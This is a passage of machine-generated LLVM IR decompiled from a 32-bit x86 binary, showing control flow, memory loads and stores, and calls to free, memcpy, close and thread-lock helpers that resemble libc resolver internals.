  %v1_8055b5b = icmp eq i1 %v12_8055b53, false
  br i1 %v1_8055b5b, label %dec_label_pc_8055bfe, label %dec_label_pc_8055b61

dec_label_pc_8055b61:                             ; preds = %dec_label_pc_8055b08.dec_label_pc_8055b61_crit_edge, %dec_label_pc_8055b53, %dec_label_pc_8055b49
  %v4_8055b61 = phi i32 [ %v4_8055b61.pre, %dec_label_pc_8055b08.dec_label_pc_8055b61_crit_edge ], [ %v3_8055b49, %dec_label_pc_8055b53 ], [ 1, %dec_label_pc_8055b49 ]
  %v15_8055b61 = icmp eq i32 %v3_8055b34, %v4_8055b61
  br i1 %v15_8055b61, label %dec_label_pc_8055b76, label %dec_label_pc_8055b6a

dec_label_pc_8055b6a:                             ; preds = %dec_label_pc_8055b61
  %v1_8055b6d = inttoptr i32 %v0_8055b34 to i32*
  %v2_8055b6d = load i32, i32* %v1_8055b6d, align 4
  %v5_8055b6d = inttoptr i32 %v0_8055b37 to i32*
  store i32 %v2_8055b6d, i32* %v5_8055b6d, align 4
  %v1_8055b6f = call i32 @free(i32 -1)
  store i32 %v1_8055b6f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055be6

dec_label_pc_8055b76:                             ; preds = %dec_label_pc_8055b61
  %v0_8055b76 = load i32, i32* @ebx, align 4
  %v1_8055b78 = sub i32 -1, %v0_8055b76
  store i32 %v1_8055b78, i32* %eax.global-to-local, align 4
  %v2_8055b7a = add i32 %v0_8055b37, 120
  %v3_8055b7a = inttoptr i32 %v2_8055b7a to i32*
  %v4_8055b7a = load i32, i32* %v3_8055b7a, align 4
  %v5_8055b7a = add i32 %v4_8055b7a, %v1_8055b78
  store i32 %v5_8055b7a, i32* %eax.global-to-local, align 4
  %v2_8055b7e = add i32 %v0_8055b34, 36
  %v3_8055b7e = inttoptr i32 %v2_8055b7e to i32*
  store i32 %v5_8055b7a, i32* %v3_8055b7e, align 4
  %v0_8055b81 = load i32, i32* @edi, align 4
  %v1_8055b81 = add i32 %v0_8055b81, 16
  %v2_8055b81 = inttoptr i32 %v1_8055b81 to i32*
  %v3_8055b81 = load i32, i32* %v2_8055b81, align 4
  %v1_8055b84 = add i32 %v3_8055b81, 4
  store i32 %v1_8055b84, i32* %eax.global-to-local, align 4
  %v2_8055b87 = add i32 %v0_8055b81, 36
  %v3_8055b87 = inttoptr i32 %v2_8055b87 to i32*
  %v4_8055b87 = load i32, i32* %v3_8055b87, align 4
  %v7_8055b87 = mul i32 %v4_8055b87, %v1_8055b84
  store i32 %v7_8055b87, i32* %eax.global-to-local, align 4
  %v2_8055b8b = add i32 %v0_8055b81, 32
  %v3_8055b8b = inttoptr i32 %v2_8055b8b to i32*
  %v4_8055b8b = load i32, i32* %v3_8055b8b, align 4
  %v6_8055b8e = icmp ugt i32 %v7_8055b87, %v4_8055b8b
  br i1 %v6_8055b8e, label %dec_label_pc_8055b76.dec_label_pc_8055bfe.loopexit_crit_edge, label %dec_label_pc_8055b90

dec_label_pc_8055b76.dec_label_pc_8055bfe.loopexit_crit_edge: ; preds = %dec_label_pc_8055b76
  %v0_8055bfe.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8055bfe

dec_label_pc_8055b90:                             ; preds = %dec_label_pc_8055b76
  store i32 0, i32* %v3_8055b87, align 4
  %v0_8055b97 = load i32, i32* @esp, align 4
  %v1_8055b97 = add i32 %v0_8055b97, 27
  %v2_8055b97 = inttoptr i32 %v1_8055b97 to i8*
  store i8 0, i8* %v2_8055b97, align 1
  %v1_8055be9.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8055be9

dec_label_pc_8055b9e:                             ; preds = %dec_label_pc_8055afd
  %v1_8055ba1 = add i32 %v0_8055ade, 132
  %v2_8055ba1 = inttoptr i32 %v1_8055ba1 to i32*
  %v3_8055ba1 = load i32, i32* %v2_8055ba1, align 4
  %v6_8055ba1 = inttoptr i32 %v0_8055ade to i32*
  store i32 %v3_8055ba1, i32* %v6_8055ba1, align 4
  %v1_8055ba8 = call i32 @free(i32 -1)
  store i32 %v1_8055ba8, i32* %eax.global-to-local, align 4
  %v0_8055bad = load i32, i32* @esp, align 4
  %v1_8055bad = add i32 %v0_8055bad, 16
  %v1_8055bb0 = add i32 %v0_8055bad, 260
  %v2_8055bb0 = inttoptr i32 %v1_8055bb0 to i32*
  %v3_8055bb0 = load i32, i32* %v2_8055bb0, align 4
  store i32 %v3_8055bb0, i32* %eax.global-to-local, align 4
  %v1_8055bb7 = add i32 %v0_8055bad, 136
  %v2_8055bb7 = inttoptr i32 %v1_8055bb7 to i32*
  %v3_8055bb7 = load i32, i32* %v2_8055bb7, align 4
  %v15_8055bb7 = icmp eq i32 %v3_8055bb7, %v3_8055bb0
  %v1_8055bbb = icmp eq i1 %v15_8055bb7, false
  br i1 %v1_8055bbb, label %dec_label_pc_8055be9, label %dec_label_pc_8055bbd

dec_label_pc_8055bbd:                             ; preds = %dec_label_pc_8055b9e
  %v0_8055bbd = load i32, i32* @edi, align 4
  %v1_8055bbd = add i32 %v0_8055bbd, 16
  %v2_8055bbd = inttoptr i32 %v1_8055bbd to i32*
  %v3_8055bbd = load i32, i32* %v2_8055bbd, align 4
  store i32 %v3_8055bbd, i32* %eax.global-to-local, align 4
  %v2_8055bc0 = add i32 %v0_8055bad, 148
  %v3_8055bc0 = inttoptr i32 %v2_8055bc0 to i32*
  %v4_8055bc0 = load i32, i32* %v3_8055bc0, align 4
  %v15_8055bc0 = icmp eq i32 %v3_8055bbd, %v4_8055bc0
  %v1_8055bc7 = icmp eq i1 %v15_8055bc0, false
  br i1 %v1_8055bc7, label %dec_label_pc_8055c83, label %dec_label_pc_8055bcd

dec_label_pc_8055bcd:                             ; preds = %dec_label_pc_8055bbd
  %v0_8055bcd = load i32, i32* @edx, align 4
  %v2_8055bcd = add i32 %v0_8055bad, 12
  %v3_8055bcd = inttoptr i32 %v2_8055bcd to i32*
  store i32 %v0_8055bcd, i32* %v3_8055bcd, align 4
  %v0_8055bce = load i32, i32* %eax.global-to-local, align 4
  %v2_8055bce = add i32 %v0_8055bad, 8
  %v3_8055bce = inttoptr i32 %v2_8055bce to i32*
  store i32 %v0_8055bce, i32* %v3_8055bce, align 4
  %v1_8055bcf = add i32 %v0_8055bad, 152
  %v2_8055bcf = inttoptr i32 %v1_8055bcf to i32*
  %v3_8055bcf = load i32, i32* %v2_8055bcf, align 4
  %v5_8055bcf = add i32 %v0_8055bad, 4
  %v6_8055bcf = inttoptr i32 %v5_8055bcf to i32*
  store i32 %v3_8055bcf, i32* %v6_8055bcf, align 4
  %v0_8055bd6 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055bd6 = load i32, i32* @edi, align 4
  %v2_8055bd6 = add i32 %v1_8055bd6, 36
  %v3_8055bd6 = inttoptr i32 %v2_8055bd6 to i32*
  %v4_8055bd6 = load i32, i32* %v3_8055bd6, align 4
  %v7_8055bd6 = mul i32 %v4_8055bd6, %v0_8055bd6
  store i32 %v7_8055bd6, i32* %eax.global-to-local, align 4
  %v2_8055bda = add i32 %v1_8055bd6, 28
  %v3_8055bda = inttoptr i32 %v2_8055bda to i32*
  %v4_8055bda = load i32, i32* %v3_8055bda, align 4
  %v5_8055bda = add i32 %v4_8055bda, %v7_8055bd6
  store i32 %v5_8055bda, i32* %eax.global-to-local, align 4
  %v3_8055bdd = inttoptr i32 %v0_8055bad to i32*
  store i32 %v5_8055bda, i32* %v3_8055bdd, align 4
  %v5_8055bde = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_805571c, i32 %v3_805577b)
  store i32 %v5_8055bde, i32* %eax.global-to-local, align 4
  %v0_8055be3 = load i32, i32* @edi, align 4
  %v1_8055be3 = add i32 %v0_8055be3, 36
  %v2_8055be3 = inttoptr i32 %v1_8055be3 to i32*
  %v3_8055be3 = load i32, i32* %v2_8055be3, align 4
  %v4_8055be3 = add i32 %v3_8055be3, 1
  store i32 %v4_8055be3, i32* %v2_8055be3, align 4
  br label %dec_label_pc_8055be6

dec_label_pc_8055be6:                             ; preds = %dec_label_pc_8055b6a, %dec_label_pc_8055bcd
  %v0_8055be6 = load i32, i32* @esp, align 4
  %v1_8055be6 = add i32 %v0_8055be6, 16
  br label %dec_label_pc_8055be9

dec_label_pc_8055be9:                             ; preds = %dec_label_pc_8055b9e, %dec_label_pc_8055b90, %dec_label_pc_8055be6
  %v1_8055be9 = phi i32 [ %v1_8055bad, %dec_label_pc_8055b9e ], [ %v1_8055be9.pre, %dec_label_pc_8055b90 ], [ %v1_8055be6, %dec_label_pc_8055be6 ]
  %v0_8055be9 = load i32, i32* @esi, align 4
  %v2_8055be9 = add i32 %v1_8055be9, 52
  %v3_8055be9 = inttoptr i32 %v2_8055be9 to i32*
  %v4_8055be9 = load i32, i32* %v3_8055be9, align 4
  %v5_8055be9 = add i32 %v4_8055be9, %v0_8055be9
  store i32 %v5_8055be9, i32* @esi, align 4
  %v0_8055bed = load i32, i32* @ebx, align 4
  %v1_8055bed = add i32 %v0_8055bed, 1
  store i32 %v1_8055bed, i32* @ebx, align 4
  %v2_8055bee = add i32 %v1_8055be9, 104
  %v3_8055bee = inttoptr i32 %v2_8055bee to i32*
  %v4_8055bee = load i32, i32* %v3_8055bee, align 4
  %v5_8055bee = sub i32 %v1_8055bed, %v4_8055bee
  %v11_8055bee = xor i32 %v4_8055bee, %v1_8055bed
  %v12_8055bee = xor i32 %v5_8055bee, %v1_8055bed
  %v13_8055bee = and i32 %v12_8055bee, %v11_8055bee
  %v14_8055bee = icmp slt i32 %v13_8055bee, 0
  %v16_8055bee = icmp slt i32 %v5_8055bee, 0
  %v2_8055bf2 = icmp eq i1 %v16_8055bee, %v14_8055bee
  br i1 %v2_8055bf2, label %dec_label_pc_8055bfe, label %dec_label_pc_8055bf4

dec_label_pc_8055bf4:                             ; preds = %dec_label_pc_8055bf4.lr.ph, %dec_label_pc_8055be9
  %v0_8055bf4 = phi i32 [ %v0_8055bf4.pre, %dec_label_pc_8055bf4.lr.ph ], [ %v5_8055be9, %dec_label_pc_8055be9 ]
  %v0_8055aca81 = phi i32 [ %v1_8055bee.pre, %dec_label_pc_8055bf4.lr.ph ], [ %v1_8055be9, %dec_label_pc_8055be9 ]
  %v2_8055bf4 = add i32 %v0_8055aca81, 16
  %v3_8055bf4 = inttoptr i32 %v2_8055bf4 to i32*
  %v4_8055bf4 = load i32, i32* %v3_8055bf4, align 4
  %v5_8055bf4 = sub i32 %v0_8055bf4, %v4_8055bf4
  %v11_8055bf4 = xor i32 %v4_8055bf4, %v0_8055bf4
  %v12_8055bf4 = xor i32 %v5_8055bf4, %v0_8055bf4
  %v13_8055bf4 = and i32 %v12_8055bf4, %v11_8055bf4
  %v14_8055bf4 = icmp slt i32 %v13_8055bf4, 0
  %v16_8055bf4 = icmp slt i32 %v5_8055bf4, 0
  %v2_8055bf8 = icmp eq i1 %v16_8055bf4, %v14_8055bf4
  br i1 %v2_8055bf8, label %dec_label_pc_8055bfe, label %dec_label_pc_8055aca

dec_label_pc_8055bfe:                             ; preds = %dec_label_pc_8055aed, %dec_label_pc_8055abe, %dec_label_pc_8055be9, %dec_label_pc_8055b3f, %dec_label_pc_8055b53, %dec_label_pc_8055bf4, %dec_label_pc_8055b76.dec_label_pc_8055bfe.loopexit_crit_edge
  %v0_8055bfe = phi i32 [ %v0_8055bfe.pre.pre, %dec_label_pc_8055b76.dec_label_pc_8055bfe.loopexit_crit_edge ], [ %v1_8055bee.pre, %dec_label_pc_8055abe ], [ %v1_8055be9, %dec_label_pc_8055be9 ], [ %v1_8055b37, %dec_label_pc_8055b3f ], [ %v1_8055b37, %dec_label_pc_8055b53 ], [ %v0_8055aca81, %dec_label_pc_8055bf4 ], [ %v1_8055ade, %dec_label_pc_8055aed ]
  %v1_8055c01 = add i32 %v0_8055bfe, 20
  %v2_8055c01 = inttoptr i32 %v1_8055c01 to i32*
  %v3_8055c01 = load i32, i32* %v2_8055c01, align 4
  %v5_8055c01 = add i32 %v0_8055bfe, -16
  %v6_8055c01 = inttoptr i32 %v5_8055c01 to i32*
  store i32 %v3_8055c01, i32* %v6_8055c01, align 4
  %v1_8055c05 = call i32 @__libc_close(i32 -1)
  store i32 %v1_8055c05, i32* %eax.global-to-local, align 4
  %v0_8055c0a = load i32, i32* @esp, align 4
  %v1_8055c0d = add i32 %v0_8055c0a, 272
  %v2_8055c0d = inttoptr i32 %v1_8055c0d to i32*
  %v3_8055c0d = load i32, i32* %v2_8055c0d, align 4
  %v4_8055c0d = icmp eq i32 %v3_8055c0d, 0
  br i1 %v4_8055c0d, label %dec_label_pc_8055c22, label %dec_label_pc_8055c17

dec_label_pc_8055c17:                             ; preds = %dec_label_pc_8055bfe
  store i32 %v3_8055c0d, i32* %edx.global-to-local, align 4
  %v2_8055c1e = inttoptr i32 %v3_8055c0d to i32*
  store i32 %v2_805568e, i32* %v2_8055c1e, align 4
  %v0_8055c2e.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8055c2e

dec_label_pc_8055c22:                             ; preds = %dec_label_pc_8055bfe
  %v3_8055c25 = inttoptr i32 %v0_8055c0a to i32*
  store i32 %v2_805568e, i32* %v3_8055c25, align 4
  %v1_8055c26 = call i32 @free(i32 -1)
  store i32 %v1_8055c26, i32* %eax.global-to-local, align 4
  %v0_8055c2b = load i32, i32* @esp, align 4
  %v1_8055c2b = add i32 %v0_8055c2b, 16
  br label %dec_label_pc_8055c2e

dec_label_pc_8055c2e:                             ; preds = %dec_label_pc_8055c17, %dec_label_pc_8055c22
  %v0_8055c2e = phi i32 [ %v0_8055c2e.pre, %dec_label_pc_8055c17 ], [ %v1_8055c2b, %dec_label_pc_8055c22 ]
  %v1_8055c31 = add i32 %v0_8055c2e, 12
  %v2_8055c31 = inttoptr i32 %v1_8055c31 to i32*
  %v3_8055c31 = load i32, i32* %v2_8055c31, align 4
  %v5_8055c31 = add i32 %v0_8055c2e, -16
  %v6_8055c31 = inttoptr i32 %v5_8055c31 to i32*
  store i32 %v3_8055c31, i32* %v6_8055c31, align 4
  %v1_8055c35 = call i32 @free(i32 -1)
  store i32 %v1_8055c35, i32* @eax, align 4
  %v0_8055c3a = load i32, i32* @esp, align 4
  %v1_8055c3d = add i32 %v0_8055c3a, 8
  %v2_8055c3d = inttoptr i32 %v1_8055c3d to i32*
  store i32 ptrtoint (i8** @global_var_80617a8.550 to i32), i32* %v2_8055c3d, align 4
  %v1_8055c42 = add i32 %v0_8055c3a, 4
  %v2_8055c42 = inttoptr i32 %v1_8055c42 to i32*
  store i32 134562611, i32* %v2_8055c42, align 4
  %v1_8055c47 = add i32 %v0_8055c3a, 200
  store i32 %v1_8055c47, i32* %ebx.global-to-local, align 4
  %v3_8055c4e = inttoptr i32 %v0_8055c3a to i32*
  store i32 %v1_8055c47, i32* %v3_8055c4e, align 4
  %v2_8055c4f = call i32 @__pthread_return_void(i32 -1, i32 %v15_805571c)
  store i32 %v2_8055c4f, i32* %eax.global-to-local, align 4
  %v0_8055c54 = load i32, i32* @esp, align 4
  %v1_8055c54 = inttoptr i32 %v0_8055c54 to i32*
  store i32 ptrtoint (i8** @global_var_80617a8.550 to i32), i32* %v1_8055c54, align 4
  %v1_8055c5b = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_8055c5b, i32* %eax.global-to-local, align 4
  %v0_8055c60 = load i32, i32* @esp, align 4
  %v1_8055c60 = add i32 %v0_8055c60, 56
  %v2_8055c60 = inttoptr i32 %v1_8055c60 to i32*
  %v3_8055c60 = load i32, i32* %v2_8055c60, align 4
  store i32 %v3_8055c60, i32* @eax, align 4
  %v1_8055c64 = add i32 %v0_8055c60, 72
  %v2_8055c64 = inttoptr i32 %v1_8055c64 to i32*
  %v3_8055c64 = load i32, i32* %v2_8055c64, align 4
  store i32 %v3_8055c64, i32* %edx.global-to-local, align 4
  %v1_8055c68 = inttoptr i32 %v0_8055c60 to i32*
  %v3_8055c68 = add i32 %v0_8055c60, 4
  %v1_8055c69 = inttoptr i32 %v3_8055c68 to i32*
  store i32 1, i32* %v1_8055c69, align 4
  %v0_8055c6c = load i32, i32* @eax, align 4
  %v1_8055c6c = sext i32 %v0_8055c6c to i64
  store i64 %v1_8055c6c, i64* @global_var_80617c0.551, align 64
  %v0_8055c71 = load i32, i32* %edx.global-to-local, align 4
  %v1_8055c71 = trunc i32 %v0_8055c71 to i16
  store i16 %v1_8055c71, i16* @global_var_805b504.552, align 4
  %v0_8055c78 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8055c78, i32* %v1_8055c68, align 4
  %v2_8055c79 = call i32 @__pthread_return_void(i32 -1, i32 %v15_805571c)
  store i32 %v2_8055c79, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055dba

dec_label_pc_8055c83:                             ; preds = %dec_label_pc_8055bbd
  %v1_8055c86 = inttoptr i32 %v0_8055bbd to i32*
  %v2_8055c86 = load i32, i32* %v1_8055c86, align 4
  %v5_8055c86 = inttoptr i32 %v0_8055bad to i32*
  store i32 %v2_8055c86, i32* %v5_8055c86, align 4
  %v1_8055c88 = call i32 @free(i32 -1)
  store i32 %v1_8055c88, i32* @eax, align 4
  %v0_8055c8d = load i32, i32* @esp, align 4
  %v1_8055c8d = add i32 %v0_8055c8d, 16
  br label %dec_label_pc_8055c90

dec_label_pc_8055c90:                             ; preds = %dec_label_pc_80559c2, %dec_label_pc_8055aed, %dec_label_pc_8055ae5, %dec_label_pc_8055a81, %dec_label_pc_8055a07, %dec_label_pc_80559e3, %dec_label_pc_8055c83
  %v1_8055c97 = phi i32 [ %v1_80559d7, %dec_label_pc_80559c2 ], [ %v1_8055ade, %dec_label_pc_8055aed ], [ %v1_8055ade, %dec_label_pc_8055ae5 ], [ %v1_80559f8, %dec_label_pc_8055a81 ], [ %v1_80559f8, %dec_label_pc_8055a07 ], [ %v1_80559f8, %dec_label_pc_80559e3 ], [ %v1_8055c8d, %dec_label_pc_8055c83 ]
  %v1_8055c90 = add i32 %v1_8055c97, 51
  %v2_8055c90 = inttoptr i32 %v1_8055c90 to i8*
  %v3_8055c90 = load i8, i8* %v2_8055c90, align 1
  %v4_8055c90 = icmp eq i8 %v3_8055c90, 0
  %v1_8055c95 = icmp eq i1 %v4_8055c90, false
  br i1 %v1_8055c95, label %dec_label_pc_8055cdb, label %dec_label_pc_8055c97

dec_label_pc_8055c97:                             ; preds = %dec_label_pc_8055c90
  %v0_8055c97 = load i32, i32* @ecx, align 4
  %v2_8055c97 = add i32 %v1_8055c97, -4
  %v3_8055c97 = inttoptr i32 %v2_8055c97 to i32*
  store i32 %v0_8055c97, i32* %v3_8055c97, align 4
  %v1_8055c98 = add i32 %v1_8055c97, -8
  %v2_8055c98 = inttoptr i32 %v1_8055c98 to i32*
  store i32 ptrtoint (i32* @global_var_805b508.489 to i32), i32* %v2_8055c98, align 4
  %v1_8055c9d = add i32 %v1_8055c97, -12
  %v2_8055c9d = inttoptr i32 %v1_8055c9d to i32*
  store i32 134562611, i32* %v2_8055c9d, align 4
  %v1_8055ca2 = add i32 %v1_8055c97, 184
  store i32 %v1_8055ca2, i32* @esi, align 4
  %v2_8055ca9 = add i32 %v1_8055c97, -16
  %v3_8055ca9 = inttoptr i32 %v2_8055ca9 to i32*
  store i32 %v1_8055ca2, i32* %v3_8055ca9, align 4
  %v2_8055caa = call i32 @__pthread_return_void(i32 -1, i32 %v15_805571c)
  store i32 %v2_8055caa, i32* %eax.global-to-local, align 4
  %v0_8055caf = load i32, i32* @esp, align 4
  %v1_8055caf = inttoptr i32 %v0_8055caf to i32*
  store i32 ptrtoint (i32* @global_var_805b508.489 to i32), i32* %v1_8055caf, align 4
  %v1_8055cb6 = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_8055cb6, i32* %eax.global-to-local, align 4
  %v0_8055cbb = load i32, i32* @esp, align 4
  %v1_8055cbb = inttoptr i32 %v0_8055cbb to i32*
  %v2_8055cbb = load i32, i32* %v1_8055cbb, align 4
  store i32 %v2_8055cbb, i32* @eax, align 4
  %v3_8055cbb = add i32 %v0_8055cbb, 4
  %v1_8055cbc = inttoptr i32 %v3_8055cbb to i32*
  %v2_8055cbc = load i32, i32* %v1_8055cbc, align 4
  store i32 %v2_8055cbc, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_8055cbc, align 4
  %v0_8055cbf = load i32, i32* @esi, align 4
  store i32 %v0_8055cbf, i32* %v1_8055cbb, align 4
  %v0_8055cc0 = load i32, i32* @global_var_8061bf8.553, align 8
  store i32 %v0_8055cc0, i32* %ebx.global-to-local, align 4
  %v2_8055cc6 = call i32 @__pthread_return_void(i32 -1, i32 %v15_805571c)
  store i32 %v2_8055cc6, i32* %eax.global-to-local, align 4
  %v0_8055ccb = load i32, i32* @esp, align 4
  %v1_8055ccb = add i32 %v0_8055ccb, 16
  %v1_8055cce = add i32 %v0_8055cc0, -1
  store i32 %v1_8055cce, i32* @ebx, align 4
  %v1_8055ccf = add i32 %v0_8055ccb, 52
  %v2_8055ccf = inttoptr i32 %v1_8055ccf to i32*
  %v3_8055ccf = load i32, i32* %v2_8055ccf, align 4
  %v5_8055ccf = sub i32 %v3_8055ccf, %v1_8055cce
  %v11_8055ccf = xor i32 %v3_8055ccf, %v1_8055cce
  %v12_8055ccf = xor i32 %v5_8055ccf, %v3_8055ccf
  %v13_8055ccf = and i32 %v12_8055ccf, %v11_8055ccf
  %v14_8055ccf = icmp slt i32 %v13_8055ccf, 0
  %v16_8055ccf = icmp slt i32 %v5_8055ccf, 0
  %v2_8055cd3 = icmp eq i1 %v16_8055ccf, %v14_8055ccf
  br i1 %v2_8055cd3, label %dec_label_pc_8055cdb, label %dec_label_pc_8055cd5

dec_label_pc_8055cd5:                             ; preds = %dec_label_pc_8055c97
  %v4_8055cd5 = add i32 %v3_8055ccf, 1
  store i32 %v4_8055cd5, i32* %v2_8055ccf, align 4
  br label %dec_label_pc_8055cfc.backedge

dec_label_pc_8055cdb:                             ; preds = %dec_label_pc_8055964, %dec_label_pc_8055c97, %dec_label_pc_8055c90, %dec_label_pc_805597b
  %v1_8055ce8 = phi i32 [ %v1_8055ccb, %dec_label_pc_8055c97 ], [ %v1_8055c97, %dec_label_pc_8055c90 ], [ %v1_80559b7, %dec_label_pc_805597b ], [ %v0_8055cdb.pre, %dec_label_pc_8055964 ]
  %v1_8055cdb = add i32 %v1_8055ce8, 40
  %v2_8055cdb = inttoptr i32 %v1_8055cdb to i32*
  %v3_8055cdb = load i32, i32* %v2_8055cdb, align 4
  %v1_8055cdf = add i32 %v3_8055cdb, 1
  store i32 %v1_8055cdf, i32* %eax.global-to-local, align 4
  %v1_8055ce0 = ashr i32 %v1_8055cdf, 31
  store i32 %v1_8055ce0, i32* %edx.global-to-local, align 4
  %v1_8055ce1 = add i32 %v1_8055ce8, 248
  %v2_8055ce1 = inttoptr i32 %v1_8055ce1 to i32*
  %v3_8055ce1 = load i32, i32* %v2_8055ce1, align 4
  %v5_8055ce1 = zext i32 %v1_8055cdf to i64
  %v7_8055ce1 = zext i32 %v1_8055ce0 to i64
  %v8_8055ce1 = mul nuw i64 %v7_8055ce1, 4294967296
  %v9_8055ce1 = or i64 %v8_8055ce1, %v5_8055ce1
  %v10_8055ce1 = zext i32 %v3_8055ce1 to i64
  %v11_8055ce1 = sdiv i64 %v9_8055ce1, %v10_8055ce1
  %v12_8055ce1 = trunc i64 %v11_8055ce1 to i32
  store i32 %v12_8055ce1, i32* %eax.global-to-local, align 4
  %v13_8055ce1 = srem i64 %v9_8055ce1, %v10_8055ce1
  %v14_8055ce1 = trunc i64 %v13_8055ce1 to i32
  store i32 %v14_8055ce1, i32* %edx.global-to-local, align 4
  store i32 %v14_8055ce1, i32* %v2_8055cdb, align 4
  %v1_8055cec = icmp eq i32 %v14_8055ce1, 0
  %v1_8055cee = icmp eq i1 %v1_8055cec, false
  br i1 %v1_8055cee, label %dec_label_pc_8055cf4, label %dec_label_pc_8055cf0

dec_label_pc_8055cf0:                             ; preds = %dec_label_pc_8055cdb
  %v0_8055cf0 = load i32, i32* @esp, align 4
  %v1_8055cf0 = add i32 %v0_8055cf0, 28
  %v2_8055cf0 = inttoptr i32 %v1_8055cf0 to i32*
  %v3_8055cf0 = load i32, i32* %v2_8055cf0, align 4
  %v4_8055cf0 = add i32 %v3_8055cf0, 1
  store i32 %v4_8055cf0, i32* %v2_8055cf0, align 4
  br label %dec_label_pc_8055cf4

dec_label_pc_8055cf4:                             ; preds = %dec_label_pc_8055cdb, %dec_label_pc_8055cf0
  %v0_8055cf4 = load i32, i32* @esp, align 4
  %v1_8055cf4 = add i32 %v0_8055cf4, 36
  %v2_8055cf4 = inttoptr i32 %v1_8055cf4 to i32*
  store i32 -1, i32* %v2_8055cf4, align 4
  br label %dec_label_pc_8055cfc.backedge

dec_label_pc_8055cfc.backedge:                    ; preds = %dec_label_pc_8055cf4, %dec_label_pc_8055972, %dec_label_pc_8055a60, %dec_label_pc_8055cd5
  %v0_8055cfc.pre = load i32, i32* @esp, align 4
  %v1_8055cfc = add i32 %v0_8055cfc.pre, 28
  %v2_8055cfc = inttoptr i32 %v1_8055cfc to i32*
  %v3_8055cfc = load i32, i32* %v2_8055cfc, align 4
  %tmp120 = icmp ult i32 %v3_8055cfc, 3
  br i1 %tmp120, label %dec_label_pc_805575c, label %dec_label_pc_8055d21

dec_label_pc_8055d21:                             ; preds = %dec_label_pc_80556d6, %dec_label_pc_8055772, %dec_label_pc_8055866, %dec_label_pc_8055cfc.backedge, %entry, %dec_label_pc_80556b0, %dec_label_pc_80556b8, %dec_label_pc_80556c6
  %stack_var_-192.0 = phi i16 [ -1, %dec_label_pc_80556c6 ], [ -1, %dec_label_pc_80556b8 ], [ -1, %dec_label_pc_80556b0 ], [ -1, %entry ], [ %v0_8055723, %dec_label_pc_8055cfc.backedge ], [ %v0_8055723, %dec_label_pc_8055866 ], [ %v0_8055723, %dec_label_pc_8055772 ], [ %v0_8055723, %dec_label_pc_80556d6 ]
  %v0_8055d21 = call i32 @__GI___h_errno_location()
  store i32 %v0_8055d21, i32* %eax.global-to-local, align 4
  %v1_8055d26 = inttoptr i32 %v0_8055d21 to i32*
  store i32 -1, i32* %v1_8055d26, align 4
  %v0_8055d2c = load i32, i32* @esp, align 4
  %v1_8055d2c = add i32 %v0_8055d2c, 44
  %v2_8055d2c = inttoptr i32 %v1_8055d2c to i32*
  %v3_8055d2c = load i32, i32* %v2_8055d2c, align 4
  store i32 %v3_8055d2c, i32* %eax.global-to-local, align 4
  %v2_8055d30 = add i32 %v0_8055d2c, 56
  %v3_8055d30 = inttoptr i32 %v2_8055d30 to i32*
  store i32 %v3_8055d2c, i32* %v3_8055d30, align 4
  br label %dec_label_pc_8055d34

dec_label_pc_8055d34:                             ; preds = %dec_label_pc_8055a99, %dec_label_pc_8055a71, %dec_label_pc_8055d21
  %stack_var_-192.1 = phi i16 [ %stack_var_-192.0, %dec_label_pc_8055d21 ], [ %v0_8055723, %dec_label_pc_8055a99 ], [ %v0_8055723, %dec_label_pc_8055a71 ]
  %v0_8055d34 = load i32, i32* @esp, align 4
  %v1_8055d34 = add i32 %v0_8055d34, 20
  %v2_8055d34 = inttoptr i32 %v1_8055d34 to i32*
  %v3_8055d34 = load i32, i32* %v2_8055d34, align 4
  %v13_8055d34 = icmp eq i32 %v3_8055d34, -1
  br i1 %v13_8055d34, label %dec_label_pc_8055d34.dec_label_pc_8055d4a_crit_edge, label %dec_label_pc_8055d3b

dec_label_pc_8055d34.dec_label_pc_8055d4a_crit_edge: ; preds = %dec_label_pc_8055d34
  %.pre = sext i16 %stack_var_-192.1 to i32
  br label %dec_label_pc_8055d4a

dec_label_pc_8055d3b:                             ; preds = %dec_label_pc_8055d34
  %v3_8055d3e = load i32, i32* %v2_8055d34, align 4
  %v5_8055d3e = add i32 %v0_8055d34, -16
  %v6_8055d3e = inttoptr i32 %v5_8055d3e to i32*
  store i32 %v3_8055d3e, i32* %v6_8055d3e, align 4
  %v1_8055d42 = sext i16 %stack_var_-192.1 to i32
  %v2_8055d42 = call i32 @__libc_close(i32 %v1_8055d42)
  store i32 %v2_8055d42, i32* %eax.global-to-local, align 4
  %v0_8055d47 = load i32, i32* @esp, align 4
  %v1_8055d47 = add i32 %v0_8055d47, 16
  br label %dec_label_pc_8055d4a

dec_label_pc_8055d4a:                             ; preds = %dec_label_pc_8055d34.dec_label_pc_8055d4a_crit_edge, %dec_label_pc_8055d3b
  %v1_8055d51.pre-phi = phi i32 [ %.pre, %dec_label_pc_8055d34.dec_label_pc_8055d4a_crit_edge ], [ %v1_8055d42, %dec_label_pc_8055d3b ]
  %v0_8055d4a = phi i32 [ %v0_8055d34, %dec_label_pc_8055d34.dec_label_pc_8055d4a_crit_edge ], [ %v1_8055d47, %dec_label_pc_8055d3b ]
  %v1_8055d4d = add i32 %v0_8055d4a, 12
  %v2_8055d4d = inttoptr i32 %v1_8055d4d to i32*
  %v3_8055d4d = load i32, i32* %v2_8055d4d, align 4
  %v5_8055d4d = add i32 %v0_8055d4a, -16
  %v6_8055d4d = inttoptr i32 %v5_8055d4d to i32*
  store i32 %v3_8055d4d, i32* %v6_8055d4d, align 4
  %v2_8055d51 = call i32 @free(i32 %v1_8055d51.pre-phi)
  store i32 %v2_8055d51, i32* %eax.global-to-local, align 4
  %v1_8055d56 = load i32, i32* @esp, align 4
  %v2_8055d56 = inttoptr i32 %v1_8055d56 to i32*
  store i32 %v2_805568e, i32* %v2_8055d56, align 4
  %v2_8055d59 = call i32 @free(i32 %v1_8055d51.pre-phi)
  store i32 %v2_8055d59, i32* @eax, align 4
  %v0_8055d5e = load i32, i32* @esp, align 4
  %v1_8055d61 = add i32 %v0_8055d5e, 32
